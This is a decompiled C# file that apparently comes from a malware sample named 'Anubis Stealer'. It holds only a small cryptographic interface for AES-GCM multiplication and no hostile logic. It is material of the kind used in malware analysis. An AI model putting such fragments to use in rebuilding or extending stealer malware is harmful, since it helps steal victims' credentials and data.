// Decompiled with JetBrains decompiler
// Type: Anubis.IGcmMultiplier
// Assembly: Anubis Stealer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC1199D-65A9-4D34-AA4B-98216B1632A3
// Assembly location: C:\Users\Administrator\Downloads\Build.exe

namespace Anubis
{
  public interface IGcmMultiplier
  {
    void Init(byte[] H);

    void MultiplyH(byte[] x);
  }
}
